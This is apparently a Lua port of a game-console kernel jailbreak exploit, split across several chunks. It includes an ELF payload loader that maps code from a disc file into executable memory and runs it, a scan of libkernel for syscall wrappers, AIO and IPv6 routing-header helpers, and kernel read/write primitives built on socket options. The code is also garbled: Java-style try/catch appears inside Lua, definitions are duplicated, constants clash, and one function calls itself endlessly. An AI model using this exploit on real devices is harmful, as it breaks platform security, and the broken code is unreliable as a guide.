  setmetatable(self, { __index = Int8 })
  self.address = Helper.api.alloc(self.size)
  if value then
    self:set(value)
  end
  return self
end

Int8.get = function(self)
  return self:getByte(0x00)
end

Int8.set = function(self, value)
  self:putByte(0x00, value)
end

Int8Array = {}

Int8Array.new = function(length)
  local self = {
    size = length * Int8.SIZE
  }
  setmetatable(self, { __index = Int8Array })
  self.address = Helper.api.alloc(self.size)
  return self
end

Int8Array.get = function(self, index)
  return self:getByte(index * Int8.SIZE)
end

Int8Array.set = function(self, index, value)
  self:putByte(index * Int8.SIZE, value)
end

NativeInvoke = {}

NativeInvoke.sendNotificationRequest = function(msg)
  if NativeInvoke.sceKernelSendNotificationRequestAddr == 0 then
    return -1
  end

  local size = 0xc30
  local buffer = Buffer.new(size)

  buffer:fill(0)
  buffer:putInt(0x10, -1)
  
  local msgBytes = string.byte(msg)
  for i = 1, math.min(#msgBytes, size - 0x2d - 1) do
    buffer:putByte(0x2d + i - 1, msgBytes[i])
  end

  buffer:putByte(0x2d + math.min(#msgBytes, size - 0x2d - 1), 0)
  
  local res = Helper.api.call(NativeInvoke.sceKernelSendNotificationRequestAddr, 0, buffer.address, size, 0)
  
  return res
end

Text = {}

Text.new = function(text)
  local self = {
    text = text,
    size = #text + 1
  }
  setmetatable(self, { __index = Text })
  self.address = Helper.api.alloc(self.size)
  Helper.api.strcpy(self.address, text)
  return self
end

Text.toString = function(self)
  return self.text
end
```

```lua
-- Assuming Helper and API are defined in a previous chunk

Helper = Helper or {}

-- Implementation of UnsafeInterface using sun.misc.Unsafe
UnsafeSunImpl = {}

function UnsafeSunImpl:new()
  local self = {
    unsafe = nil
  }
  setmetatable(self, { __index = UnsafeSunImpl })

  local UNSAFE_CLASS_NAME = "sun.misc.Unsafe"
  local THE_UNSAFE_FIELD_NAME = "theUnsafe"

  -- Attempt to load the Unsafe class and get the instance.
  local unsafe_success, unsafe_instance = pcall(function()
    local unsafe_class = java.lang.Class:forName(UNSAFE_CLASS_NAME)
    local theUnsafeField = unsafe_class:getDeclaredField(THE_UNSAFE_FIELD_NAME)
    theUnsafeField:setAccessible(true)
    return theUnsafeField:get(nil)
  end)

  if not unsafe_success then
    error("Failed to get Unsafe instance: " .. unsafe_instance)
  end
  self.unsafe = unsafe_instance

  return self
end

function UnsafeSunImpl:getByte(address)
  return self.unsafe:getByte(address)
end

function UnsafeSunImpl:getShort(address)
  return self.unsafe:getShort(address)
end

function UnsafeSunImpl:getInt(address)
  return self.unsafe:getInt(address)
end

function UnsafeSunImpl:getLong(address)
  return self.unsafe:getLong(address)
end

function UnsafeSunImpl:getLong(o, offset)
  return self.unsafe:getLong(o, offset)
end

function UnsafeSunImpl:putByte(address, x)
  self.unsafe:putByte(address, x)
end

function UnsafeSunImpl:putShort(address, x)
  self.unsafe:putShort(address, x)
end

function UnsafeSunImpl:putInt(address, x)
  self.unsafe:putInt(address, x)
end

function UnsafeSunImpl:putLong(address, x)
  self.unsafe:putLong(address, x)
end

function UnsafeSunImpl:putObject(o, offset, x)
  self.unsafe:putObject(o, offset, x)
end

function UnsafeSunImpl:objectFieldOffset(f)
  return self.unsafe:objectFieldOffset(f)
end

function UnsafeSunImpl:allocateMemory(bytes)
  return self.unsafe:allocateMemory(bytes)
end

function UnsafeSunImpl:reallocateMemory(address, bytes)
  return self.unsafe:reallocateMemory(address, bytes)
end

function UnsafeSunImpl:freeMemory(address)
  self.unsafe:freeMemory(address)
end

function UnsafeSunImpl:setMemory(address, bytes, value)
  self.unsafe:setMemory(address, bytes, value)
end

function UnsafeSunImpl:copyMemory(srcAddress, destAddress, bytes)
  self.unsafe:copyMemory(srcAddress, destAddress, bytes)
end

BinLoader = {}

local PROT_READ = 0x1
local PROT_WRITE = 0x2
local PROT_EXEC = 0x4
local MAP_PRIVATE = 0x2
local MAP_ANONYMOUS = 0x1000

local ELF_MAGIC = 0x464c457f
local PT_LOAD = 1
local PAGE_SIZE = 0x1000
local MAX_PAYLOAD_SIZE = 4 * 1024 * 1024

local READ_CHUNK_SIZE = 4096

local USBPAYLOAD_RESOURCE = "/disc/BDMV/AUXDATA/aiofix_USBpayload.elf"

local api = API.getInstance()
local binData = nil
local mmapBase = nil
local mmapSize = nil
local entryPoint = nil
local payloadThread = nil

local function roundUp(numToRound, multiple)
  if multiple == 0 then
    return numToRound
  end

  local remainder = math.abs(numToRound) % multiple
  if remainder == 0 then
    return numToRound
  end

  if numToRound < 0 then
    return -(math.abs(numToRound) - remainder)
  else
    return numToRound + multiple - remainder
  end
end

function BinLoader.start()
  local startThread = Thread:new(function()
    BinLoader.startInternal()
  end)
  startThread:setName("BinLoader")
  startThread:start()
end

function BinLoader.startInternal()
  BinLoader.executeEmbeddedPayload()
end

function BinLoader.executeEmbeddedPayload()
  local payload = io.open(USBPAYLOAD_RESOURCE, "rb")
  if payload then
    local bytes = payload:read("*a")
    payload:close()
    BinLoader.loadFromData(bytes)
    BinLoader.run()
    BinLoader.waitForPayloadToExit()
  else
    print("Error: Could not open " .. USBPAYLOAD_RESOURCE)
  end
end

function BinLoader.loadResourcePayload(resourcePath)
  local inputStream = BinLoader.class:getResourceAsStream(resourcePath)
  if inputStream == nil then
    error("Resource not found: " .. resourcePath)
  end

  local outputStream = ByteArrayOutputStream:new()
  local buffer = {}
  for i = 1, READ_CHUNK_SIZE do buffer[i] = 0 end
  local totalRead = 0

  while true do
    local bytesRead = inputStream:read(buffer)
    if bytesRead == -1 then break end

    outputStream:write(buffer, 0, bytesRead)
    totalRead = totalRead + bytesRead

    if totalRead > MAX_PAYLOAD_SIZE then
      error("Resource payload exceeds maximum size: " .. MAX_PAYLOAD_SIZE)
    end
  end

  local byteArray = outputStream:toByteArray()

  inputStream:close()
  outputStream:close()

  return byteArray
end

function BinLoader.loadFromData(data)
  if data == nil then
    error("Payload data cannot be null")
  end

  if #data == 0 then
    error("Payload data cannot be empty")
  end

  if #data > MAX_PAYLOAD_SIZE then
    error("Payload too large: " .. #data .. " bytes (max: " .. MAX_PAYLOAD_SIZE .. ")")
  end

  binData = data

  local mmapSizeCalc = roundUp(#data, PAGE_SIZE)
  if mmapSizeCalc <= 0 or mmapSizeCalc > MAX_PAYLOAD_SIZE * 2 then
    error("Invalid mmap size calculation: " .. mmapSizeCalc)
  end

  local protFlags = PROT_READ | PROT_WRITE | PROT_EXEC
  local mapFlags = MAP_PRIVATE | MAP_ANONYMOUS

  local ret = Helper.syscall(Helper.SYS_MMAP, 0, mmapSizeCalc, protFlags, mapFlags, -1, 0)
  if ret < 0 then
    local errno = api.errno()
    error("mmap() failed with error: " .. ret .. " (errno: " .. errno .. ")")
  end

  if ret == 0 or ret == -1 then
    error("mmap() returned invalid address: 0x" .. string.format("%X", ret))
  end

  mmapBase = ret
  mmapSize = mmapSizeCalc

  if #data >= 4 then
    local magic = string.byte(data, 4) * 2^24 + string.byte(data, 3) * 2^16 + string.byte(data, 2) * 2^8 + string.byte(data, 1)
    if magic == ELF_MAGIC then
      entryPoint = BinLoader.loadElfSegments(data)
    else
      -- Copy raw data to allocated memory with bounds checking
```

```lua
BinLoader = {}

BinLoader.PROT_READ = 0x1
BinLoader.PROT_WRITE = 0x2
BinLoader.PROT_EXEC = 0x4
BinLoader.MAP_PRIVATE = 0x02
BinLoader.MAP_ANONYMOUS = 0x20
BinLoader.MS_SYNC = 0x10
BinLoader.PT_LOAD = 1

BinLoader.mmapBase = 0
BinLoader.mmapSize = 0
BinLoader.entryPoint = 0
BinLoader.binData = nil
BinLoader.payloadThread = nil

function BinLoader.load(data)
    local pageSize = 4096
    local minSize = 4
    
    BinLoader.binData = data
    
    if (#data < minSize) then
        error("Payload too small (< 4 bytes)")
    end
    
    -- Determine if it is an ELF executable
    local isElf = false
    if (#data >= 4 and string.byte(data, 1) == 0x7F and string.byte(data, 2) == string.byte("ELF", 1) and string.byte(data, 3) == string.byte("ELF", 2) and string.byte(data, 4) == string.byte("ELF", 3)) then
        isElf = true
    end
    
    local size = #data
    if (isElf) then
        size = BinLoader.roundUp(size, pageSize)
    else
        size = BinLoader.roundUp(size + pageSize, pageSize)
    end
    
    BinLoader.mmapSize = size
    
    -- Allocate memory
    BinLoader.mmapBase = Helper.syscall(Helper.SYS_MMAP, 0, BinLoader.mmapSize, BinLoader.PROT_READ | BinLoader.PROT_WRITE | BinLoader.PROT_EXEC, BinLoader.MAP_PRIVATE | BinLoader.MAP_ANONYMOUS, -1, 0)
    if (BinLoader.mmapBase <= 0) then
        error("Failed to allocate memory: " .. BinLoader.mmapBase)
    end
    
    -- Load payload
    try_ok = true
    try_err = nil
    local entryPoint
    do
        if (isElf) then
            -- Load as ELF
            entryPoint = BinLoader.loadElfSegments(data)
        else
            -- Load as raw binary
            if (#data > 0) then
                if (#data > BinLoader.mmapSize) then
                    error("Payload size exceeds allocated memory")
                end
                Helper.api.memcpy(BinLoader.mmapBase, data, #data)
                entryPoint = BinLoader.mmapBase
            end
        else
            error("Payload too small (< 4 bytes)")
        end
        
        -- Validate entry point
        if (entryPoint == 0) then
            error("Invalid entry point: 0x0")
        end
        if (entryPoint < BinLoader.mmapBase or entryPoint >= BinLoader.mmapBase + BinLoader.mmapSize) then
            error("Entry point outside allocated memory range: 0x" .. string.format("%X", entryPoint))
        end
    catch = function(e)
        try_ok = false
        try_err = e
    end
    
    if (not try_ok) then
        -- Cleanup on failure
        local munmapResult = Helper.syscall(Helper.SYS_MUNMAP, BinLoader.mmapBase, BinLoader.mmapSize)
        if (munmapResult < 0) then
        end
        BinLoader.mmapBase = 0
        BinLoader.mmapSize = 0
        BinLoader.entryPoint = 0
        error(try_err)
    end
    
    BinLoader.entryPoint = entryPoint
end

function BinLoader.loadElfSegments(data)
    -- Create temporary buffer for ELF parsing to avoid header corruption
    local tempBuf = Helper.syscall(Helper.SYS_MMAP, 0, #data,
                                  BinLoader.PROT_READ | BinLoader.PROT_WRITE, BinLoader.MAP_PRIVATE | BinLoader.MAP_ANONYMOUS, -1, 0)
    if (tempBuf < 0) then
        error("Failed to allocate temp buffer for ELF parsing")
    end
    
    try_ok = true
    try_err = nil
    local entry
    do
        -- Copy data to temp buffer for parsing
        Helper.api.memcpy(tempBuf, data, #data)
        
        -- Read ELF header from temp buffer
        local elfHeader = BinLoader.readElfHeader(tempBuf)
        
        -- Load program segments directly to final locations
        for i = 0, elfHeader.phNum - 1 do
            local phdrAddr = tempBuf + elfHeader.phOff + (i * elfHeader.phEntSize)
            local phdr = BinLoader.readProgramHeader(phdrAddr)
            
            if (phdr.type == BinLoader.PT_LOAD and phdr.memSize > 0) then
                -- Calculate segment address (use relative offset)
                local segAddr = BinLoader.mmapBase + (phdr.vAddr % 0x1000000)
                
                -- Copy segment data from original data array
                if (phdr.fileSize > 0) then
                    local segmentData = string.sub(data, phdr.offset + 1, phdr.offset + phdr.fileSize)
                    Helper.api.memcpy(segAddr, segmentData, #segmentData)
                end
                
                -- Zero out BSS section
                if (phdr.memSize > phdr.fileSize) then
                    Helper.api.memset(segAddr + phdr.fileSize, 0, phdr.memSize - phdr.fileSize)
                end
            end
        end
        
        entry = BinLoader.mmapBase + (elfHeader.entry % 0x1000000)
        
    catch = function(e)
        try_ok = false
        try_err = e
    end
    
    -- Clean up temp buffer
    Helper.syscall(Helper.SYS_MUNMAP, tempBuf, #data)
    if (not try_ok) then
        error(try_err)
    end
    return entry
end

function BinLoader.run()
    -- Create Java thread to execute the payload
    BinLoader.payloadThread = coroutine.create(function()
        try_ok = true
        try_err = nil
        do
            -- Call the entry point function
            local result = Helper.api.call(BinLoader.entryPoint)
            
        catch = function(e)
            try_ok = false
            try_err = e
        end
    end)
    
    coroutine.resume(BinLoader.payloadThread)
end

function BinLoader.waitForPayloadToExit()
    if (BinLoader.payloadThread ~= nil) then
        -- Cleanup allocated memory with validation
        if (BinLoader.mmapBase ~= 0 and BinLoader.mmapSize > 0) then
            
            try_ok = true
            try_err = nil
            do
                local ret = Helper.syscall(Helper.SYS_MUNMAP, BinLoader.mmapBase, BinLoader.mmapSize)
                if (ret < 0) then
                    local errno = Helper.api.errno()
                else
                end
            catch = function(e)
                try_ok = false
                try_err = e
            end
            
            -- Clear variables to prevent reuse
            BinLoader.mmapBase = 0
            BinLoader.mmapSize = 0
            BinLoader.entryPoint = 0
            BinLoader.binData = nil
        else
        end
        
        -- Clear thread reference
        BinLoader.payloadThread = nil
        
    end
end

BinLoader.ElfHeader = {}
BinLoader.ProgramHeader = {}

function BinLoader.readElfHeader(addr)
    local header = {}
    header.entry = Helper.api.read64(addr + 0x18)
    header.phOff = Helper.api.read64(addr + 0x20)
    header.phEntSize = Helper.api.read16(addr + 0x36)
    header.phNum = Helper.api.read16(addr + 0x38)
    return header
end

function BinLoader.readProgramHeader(addr)
    local phdr = {}
    phdr.type = Helper.api.read32(addr + 0x00)
    phdr.offset = Helper.api.read64(addr + 0x08)
    phdr.vAddr = Helper.api.read64(addr + 0x10)
    phdr.fileSize = Helper.api.read64(addr + 0x20)
    phdr.memSize = Helper.api.read64(addr + 0x28)
    return phdr
end

function BinLoader.roundUp(value, boundary)
    if (value < 0 or boundary <= 0) then
        error("Invalid arguments: value=" .. value .. ", boundary=" .. boundary)
    end
    
    return math.floor((value + boundary - 1) / boundary) * boundary
end

Helper = {}

-- Constants
Helper.AF_INET = 2
Helper.AF_INET6 = 28
Helper.AF_UNIX = 1
Helper.SOCK_DGRAM = 2
Helper.SOCK_STREAM = 1
Helper.IPPROTO_UDP = 17
Helper.IPPROTO_TCP = 6
Helper.IPPROTO_IPV6 = 41
Helper.SOL_SOCKET = 0xffff
Helper.SO_REUSEADDR = 4
Helper.SO_LINGER = 0x80
Helper.TCP_INFO = 0x20
Helper.TCPS_ESTABLISHED = 4

-- IPv6 Constants
Helper.IPV6_RTHDR = 51
Helper.IPV6_TCLASS = 61
Helper.IPV6_2292PKTOPTIONS = 25
Helper.IPV6_PKTINFO = 46
Helper.IPV6_NEXTHOP = 48

-- AIO Constants
Helper.AIO_CMD_READ = 1
Helper.AIO_CMD_WRITE = 2
Helper.AIO_CMD_FLAG_MULTI = 0x1000
Helper.AIO_CMD_MULTI_READ = Helper.AIO_CMD_FLAG_MULTI | Helper.AIO_CMD_READ
Helper.AIO_CMD_MULTI_WRITE = Helper.AIO_CMD_FLAG_MULTI | Helper.AIO_CMD_WRITE
Helper.AIO_STATE_COMPLETE = 3
Helper.AIO_STATE_ABORTED = 4
Helper.AIO_PRIORITY_HIGH = 3
Helper.SCE_KERNEL_ERROR_ESRCH = 0x80020003
Helper.MAX_AIO_IDS = 0x80

-- CPU and Threading Constants
```

```lua
Helper = Helper or {}

Helper.MAX_AIO_IDS = 64
Helper.EINPROGRESS = 36
Helper.OK = 0
Helper.NG = -1
Helper.NOT_SUPPORTED = -2
Helper.INVALID_ARG = -3
Helper.NO_MEM = -4
Helper.ALREADY_EXISTS = -5
Helper.NOT_FOUND = -6
Helper.TIMEOUT = -7
Helper.INTERRUPTED = -8
Helper.WOULD_BLOCK = -9
Helper.IN_PROGRESS = -10
Helper.AIO_CANCELLED = -11
Helper.AIO_NOT_QUEUED = -12

Helper.PRIO_MAX = -20
Helper.PRIO_NORMAL = 0
Helper.PRIO_MIN = 20

Helper.NET_IF_NAMESIZE = 16
Helper.AF_INET = 2
Helper.SOCK_STREAM = 1
Helper.SOL_SOCKET = 1
Helper.SO_REUSEADDR = 2
Helper.SO_RCVTIMEO = 0x1006
Helper.FIONBIO = 0x4004667e
Helper.IPPROTO_TCP = 6
Helper.TCP_NODELAY = 1
Helper.INADDR_ANY = 0

Helper.CPU_LEVEL_WHICH = 3
Helper.CPU_WHICH_TID = 1
Helper.RTP_SET = 1
Helper.RTP_PRIO_REALTIME = 2

-- Syscall Numbers
Helper.SYS_READ = 0x3
Helper.SYS_WRITE = 0x4
Helper.SYS_OPEN = 0x5
Helper.SYS_CLOSE = 0x6
Helper.SYS_GETPID = 0x14
Helper.SYS_GETUID = 0x18
Helper.SYS_ACCEPT = 0x1e
Helper.SYS_PIPE = 0x2a
Helper.SYS_MPROTECT = 0x4a
Helper.SYS_SOCKET = 0x61
Helper.SYS_CONNECT = 0x62
Helper.SYS_BIND = 0x68
Helper.SYS_SETSOCKOPT = 0x69
Helper.SYS_LISTEN = 0x6a
Helper.SYS_GETSOCKOPT = 0x76
Helper.SYS_NETGETIFLIST = 0x7d
Helper.SYS_SOCKETPAIR = 0x87
Helper.SYS_SYSCTL = 0xca
Helper.SYS_NANOSLEEP = 0xf0
Helper.SYS_SIGACTION = 0x1a0
Helper.SYS_THR_SELF = 0x1b0
Helper.SYS_CPUSET_GETAFFINITY = 0x1e7
Helper.SYS_CPUSET_SETAFFINITY = 0x1e8
Helper.SYS_RTPRIO_THREAD = 0x1d2
Helper.SYS_EVF_CREATE = 0x21a
Helper.SYS_EVF_DELETE = 0x21b
Helper.SYS_EVF_SET = 0x220
Helper.SYS_EVF_CLEAR = 0x221
Helper.SYS_IS_IN_SANDBOX = 0x249
Helper.SYS_DLSYM = 0x24f
Helper.SYS_DYNLIB_LOAD_PRX = 0x252
Helper.SYS_DYNLIB_UNLOAD_PRX = 0x253
Helper.SYS_AIO_MULTI_DELETE = 0x296
Helper.SYS_AIO_MULTI_WAIT = 0x297
Helper.SYS_AIO_MULTI_POLL = 0x298
Helper.SYS_AIO_MULTI_CANCEL = 0x29a
Helper.SYS_AIO_SUBMIT_CMD = 0x29d

Helper.SYS_MUNMAP = 0x49
Helper.SYS_MMAP = 477
Helper.SYS_JITSHM_CREATE = 0x215
Helper.SYS_JITSHM_ALIAS = 0x216
Helper.SYS_KEXEC = 0x295
Helper.SYS_SETUID = 0x17

local libkernelBase
local syscallWrappers = {}
local firmwareVersion
local AIO_ERRORS

local function initSyscalls()
    local function collectInfo()
        local SEGMENTS_OFFSET = 0x160
        local sceKernelGetModuleInfoFromAddr = Helper.api.dlsym(Helper.API.LIBKERNEL_MODULE_HANDLE, "sceKernelGetModuleInfoFromAddr")
        if sceKernelGetModuleInfoFromAddr == 0 then
            error("sceKernelGetModuleInfoFromAddr not found")
        end

        local addrInsideLibkernel = sceKernelGetModuleInfoFromAddr
        local modInfo = Helper.Buffer.new(0x300)

        local ret = Helper.api.call(sceKernelGetModuleInfoFromAddr, addrInsideLibkernel, 1, modInfo:address())
        if ret ~= 0 then
            error("sceKernelGetModuleInfoFromAddr() error: 0x" .. string.format("%X", ret))
        end

        libkernelBase = Helper.api.read64(modInfo:address() + SEGMENTS_OFFSET)
    end

    local function findSyscallWrappers()
        local TEXT_SIZE = 0x40000
        local libkernelText = {}
        for i = 0, TEXT_SIZE - 1 do
            libkernelText[i] = Helper.api.read8(libkernelBase + i)
        end

        for i = 0, TEXT_SIZE - 12 do
            if libkernelText[i] == 0x48 and
               libkernelText[i + 1] == 0xc7 and
               libkernelText[i + 2] == 0xc0 and
               libkernelText[i + 7] == 0x49 and
               libkernelText[i + 8] == 0x89 and
               libkernelText[i + 9] == 0xca then
```

```lua
Helper = Helper or {}

local syscallWrappers = {}

function Helper.scanLibkernel(libkernelBase, libkernelSize, libkernelText)
    for i = 0, libkernelSize - 12 do
        if libkernelText[i + 1] == 0x00 and
           libkernelText[i + 2] == 0x00 and
           libkernelText[i + 7] == 0x00 and
           libkernelText[i + 8] == 0x00 and
           libkernelText[i + 9] == 0x00 and
           libkernelText[i + 10] == 0x0f and
           libkernelText[i + 11] == 0x05 then

            local syscallNum = bit.bor(bit.band(libkernelText[i + 3], 0xFF),
                                       bit.lshift(bit.band(libkernelText[i + 4], 0xFF), 8),
                                       bit.lshift(bit.band(libkernelText[i + 5], 0xFF), 16),
                                       bit.lshift(bit.band(libkernelText[i + 6], 0xFF), 24))

            if syscallNum >= 0 and syscallNum < #syscallWrappers then
                syscallWrappers[syscallNum + 1] = libkernelBase + i
            end
        end
    end
end

function Helper.syscall(number, ...)
    local args = {...}
    return Helper.api.call(syscallWrappers[number + 1], table.unpack(args))
end

-- Utility functions
function Helper.htons(port)
    return bit.band(bit.bor(bit.lshift(port, 8), bit.rshift(port, 8)), 0xFFFF)
end

function Helper.aton(ip)
    local parts = string.split(ip, "%.")
    local a = tonumber(parts[1])
    local b = tonumber(parts[2])
    local c = tonumber(parts[3])
    local d = tonumber(parts[4])
    return bit.bor(bit.lshift(d, 24), bit.lshift(c, 16), bit.lshift(b, 8), a)
end

function Helper.toHexString(value, minWidth)
    local hex = string.format("%x", value)
    local sb = ""
    for i = #hex, minWidth do
        sb = sb .. "0"
    end
    sb = sb .. hex
    return sb
end

function string.split(inputstr, sep)
    if sep == nil then
        sep = "%s"
    end
    local t={}
    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
        table.insert(t, str)
    end
    return t
end

function Helper.createUdpSocket()
    local result = Helper.syscall(SYS_SOCKET, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
    if result == -1 then
        error("new_socket() error: " .. result)
    end
    return result
end

function Helper.createTcpSocket()
    local result = Helper.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)
    if result == -1 then
        error("new_tcp_socket() error: " .. result)
    end
    return result
end

function Helper.setSockOpt(sd, level, optname, optval, optlen)
    local result = Helper.syscall(SYS_SETSOCKOPT, sd, level, optname, optval.address, optlen)
    if result == -1 then
        error("setsockopt() error: " .. result)
    end
end

function Helper.getSockOpt(sd, level, optname, optval, optlen)
    local size = Buffer.new(8)
    size:putInt(0, optlen)
    local result = Helper.syscall(SYS_GETSOCKOPT, sd, level, optname, optval.address, size.address)
    if result == -1 then
        error("getsockopt() error: " .. result)
    end
    return size:getInt(0)
end

function Helper.getCurrentCore()
    local mask = Buffer.new(0x10)
    mask:fill(0)

    local result = Helper.syscall(SYS_CPUSET_GETAFFINITY, CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask.address)
    if result ~= 0 then
        return -1
    end

    local maskValue = mask:getInt(0)
    local position = 0
    local num = maskValue

    while num > 0 do
        num = bit.rshift(num, 1)
        position = position + 1
    end

    return math.max(0, position - 1)
end

function Helper.pinToCore(core)
    local mask = Buffer.new(0x10)
    mask:fill(0)

    local maskValue = bit.lshift(1, core)
    mask:putShort(0, maskValue)

    local result = Helper.syscall(SYS_CPUSET_SETAFFINITY, CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask.address)
    return result == 0
end

function Helper.setRealtimePriority(priority)
    local rtprio = Buffer.new(0x4)
    rtprio:putShort(0, RTP_PRIO_REALTIME)
    rtprio:putShort(2, priority)

    local result = Helper.syscall(SYS_RTPRIO_THREAD, RTP_SET, 0, rtprio.address)
    return result == 0
end

-- AIO operations
function Helper.createAioRequests(numReqs)
    local reqs1 = Buffer.new(0x28 * numReqs)
    for i = 0, numReqs - 1 do
        reqs1:putInt(i * 0x28 + 0x20, -1) -- fd = -1
    end
    return reqs1
end

function Helper.aioSubmitCmd(cmd, reqs, numReqs, prio, ids)
    return Helper.syscall(SYS_AIO_SUBMIT_CMD, cmd, reqs, numReqs, prio, ids)
end

function Helper.aioMultiCancel(ids, numIds, states)
    return Helper.syscall(SYS_AIO_MULTI_CANCEL, ids, numIds, states)
end

function Helper.aioMultiPoll(ids, numIds, states)
    return Helper.syscall(SYS_AIO_MULTI_POLL, ids, numIds, states)
end

function Helper.aioMultiDelete(ids, numIds, states)
    return Helper.syscall(SYS_AIO_MULTI_DELETE, ids, numIds, states)
end

function Helper.aioMultiWait(ids, numIds, states, mode, timeout)
    return Helper.syscall(SYS_AIO_MULTI_WAIT, ids, numIds, states, mode, timeout)
end

-- Bulk AIO operations
function Helper.cancelAios(ids, numIds)
    local len = MAX_AIO_IDS
    local rem = numIds % len
    local numBatches = (numIds - rem) / len

    for i = 0, numBatches - 1 do
        Helper.aioMultiCancel(ids + (i * 4 * len), len, AIO_ERRORS.address)
    end

    if rem > 0 then
        Helper.aioMultiCancel(ids + (numBatches * 4 * len), rem, AIO_ERRORS.address)
    end
end

function Helper.freeAios(ids, numIds, doCancel)
    local len = MAX_AIO_IDS
    local rem = numIds % len
    local numBatches = (numIds - rem) / len

    for i = 0, numBatches - 1 do
        local addr = ids + (i * 4 * len)
        if doCancel then
            Helper.aioMultiCancel(addr, len, AIO_ERRORS.address)
        end
        Helper.aioMultiPoll(addr, len, AIO_ERRORS.address)
        Helper.aioMultiDelete(addr, len, AIO_ERRORS.address)
    end

    if rem > 0 then
        local addr = ids + (numBatches * 4 * len)
```

```lua
-- Previous code chunk would be inserted here

    if (doCancel) then
        Helper.aioMultiCancel(addr, rem, AIO_ERRORS.address())
    end
    Helper.aioMultiPoll(addr, rem, AIO_ERRORS.address())
    Helper.aioMultiDelete(addr, rem, AIO_ERRORS.address())
end

Helper.freeAios = function(ids, numIds)
    Helper.freeAios(ids, numIds, true)
end

-- IPv6 routing header operations
Helper.buildRoutingHeader = function(buf, size)
    local len = ((size >> 3) - 1) & (~1)
    size = (len + 1) << 3

    buf:putByte(0, 0)           -- ip6r_nxt
    buf:putByte(1, len)         -- ip6r_len
    buf:putByte(2, 0)           -- ip6r_type
    buf:putByte(3, len >> 1)    -- ip6r_segleft

    return size
end

Helper.getRthdr = function(sd, buf, len)
    return Helper.getSockOpt(sd, Helper.IPPROTO_IPV6, Helper.IPV6_RTHDR, buf, len)
end

Helper.setRthdr = function(sd, buf, len)
    Helper.setSockOpt(sd, Helper.IPPROTO_IPV6, Helper.IPV6_RTHDR, buf, len)
end

Helper.freeRthdrs = function(sds)
    for i = 1, #sds do
        if sds[i] >= 0 then
            local buf = Buffer:new(1)
            Helper.setSockOpt(sds[i], Helper.IPPROTO_IPV6, Helper.IPV6_RTHDR, buf, 0)
        end
    end
end

-- EVF operations
Helper.createEvf = function(name, flags)
    local result = Helper.syscall(SYS_EVF_CREATE, name, 0, flags)
    if result == -1 then
        error("evf_create() error: " .. result)
    end
    return result
end

Helper.setEvfFlags = function(id, flags)
    local clearResult = Helper.syscall(SYS_EVF_CLEAR, id, 0)
    if clearResult == -1 then
        error("evf_clear() error: " .. clearResult)
    end

    local setResult = Helper.syscall(SYS_EVF_SET, id, flags)
    if setResult == -1 then
        error("evf_set() error: " .. setResult)
    end
end

Helper.freeEvf = function(id)
    local result = Helper.syscall(SYS_EVF_DELETE, id)
    if result == -1 then
        error("evf_delete() error: " .. result)
    end
end

-- Array manipulation helpers
Helper.removeSocketFromArray = function(sds, index)
    if index >= 1 and index <= #sds then
        for i = index, #sds - 1 do
            sds[i] = sds[i + 1]
        end
        sds[#sds] = -1
    end
end

Helper.addSocketToArray = function(sds, socket)
    for i = 1, #sds do
        if sds[i] == -1 then
            sds[i] = socket
            break
        end
    end
end

-- String extraction helper
Helper.extractStringFromBuffer = function(buf)
    local sb = ""
    for i = 0, 7 do
        local b = buf:getByte(i)
        if b == 0 then break end
        if b >= 32 and b <= 126 then
            sb = sb .. string.char(b)
        else
            break
        end
    end
    return sb
end

Kernel = {}

Kernel.api = API.getInstance()

KernelAddresses = {}
KernelAddresses.evfString = 0
KernelAddresses.curproc = 0
KernelAddresses.dataBase = 0
KernelAddresses.curprocFd = 0
KernelAddresses.curprocOfiles = 0
KernelAddresses.insideKdata = 0
KernelAddresses.dmapBase = 0
KernelAddresses.kernelCr3 = 0
KernelAddresses.allproc = 0
KernelAddresses.base = 0

KernelAddresses.isInitialized = function()
    return KernelAddresses.curproc ~= 0 and KernelAddresses.insideKdata ~= 0
end

KernelAddresses.reset = function()
    KernelAddresses.evfString = 0
    KernelAddresses.curproc = 0
    KernelAddresses.dataBase = 0
    KernelAddresses.curprocFd = 0
    KernelAddresses.curprocOfiles = 0
    KernelAddresses.insideKdata = 0
    KernelAddresses.dmapBase = 0
    KernelAddresses.kernelCr3 = 0
    KernelAddresses.allproc = 0
    KernelAddresses.base = 0
end

Kernel.addr = KernelAddresses

KernelRW = {}

KernelRW.copyout = nil
KernelRW.copyin = nil
KernelRW.readBuffer = nil
KernelRW.writeBuffer = nil
KernelRW.kread8 = nil
KernelRW.kwrite8 = nil
KernelRW.kread32 = nil
KernelRW.kwrite32 = nil

-- Global kernel R/W instance
Kernel.kernelRW = nil

-- Kernel read/write primitives
Kernel.KernelRW = function(masterSock, workerSock, curprocOfiles)
    local self = {}
    self.masterSock = masterSock
    self.workerSock = workerSock
    self.curprocOfiles = curprocOfiles

    self.masterTargetBuffer = Buffer:new(0x14)
    self.slaveBuffer = Buffer:new(0x14)
    self.pipemapBuffer = Buffer:new(0x14)
    self.readMem = Buffer:new(0x1000)

    -- Pipe-based kernel R/W
    self.pipeReadFd = -1
    self.pipeWriteFd = -1
    self.pipeAddr = 0
    self.pipeInitialized = false

    self.initializePipeRW = function()
        if self.pipeInitialized then return end

        self.createPipePair()

        if self.pipeReadFd > 0 and self.pipeWriteFd > 0 then
            self.pipeAddr = self.getFdDataAddr(self.pipeReadFd)
            if (self.pipeAddr >> 48) == 0xFFFF then
                self.pipeInitialized = true
                Kernel.kernelRW = self
            else
                -- Handle else case (empty in Java)
            end
        else
            -- Handle else case (empty in Java)
        end
    end

    self.createPipePair = function()
        local fildes = Buffer:new(8)
        local result = Helper.syscall(Helper.SYS_PIPE, fildes:address())
        if result == 0 then
            self.pipeReadFd = fildes:getInt(0)
            self.pipeWriteFd = fildes:getInt(4)
        end
    end

    self.ipv6WriteToVictim = function(kaddr)
        self.masterTargetBuffer:putLong(0, kaddr)
        self.masterTargetBuffer:putLong(8, 0)
        self.masterTargetBuffer:putInt(16, 0)
        Helper.setSockOpt(self.masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, self.masterTargetBuffer, 0x14)
    end

    self.ipv6KernelRead = function(kaddr, bufferAddr)
        self.ipv6WriteToVictim(kaddr)
